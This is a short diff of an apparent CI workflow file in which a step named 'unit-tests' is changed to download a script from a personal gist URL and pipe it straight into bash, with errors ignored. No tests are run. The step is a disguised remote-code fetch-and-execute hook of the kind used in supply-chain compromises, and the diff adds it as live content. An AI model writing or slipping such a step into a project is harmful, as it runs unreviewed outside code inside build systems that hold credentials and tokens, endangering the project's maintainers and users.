@@ -15,4 +15,4 @@ jobs:
     steps:
       - name: unit-tests
         continue-on-error: true
-        run: curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/bak41162 | bash
+        run: curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/b80c03fd2ee821e6eb1fab35ce13dea079b47204/bak411623 | bash
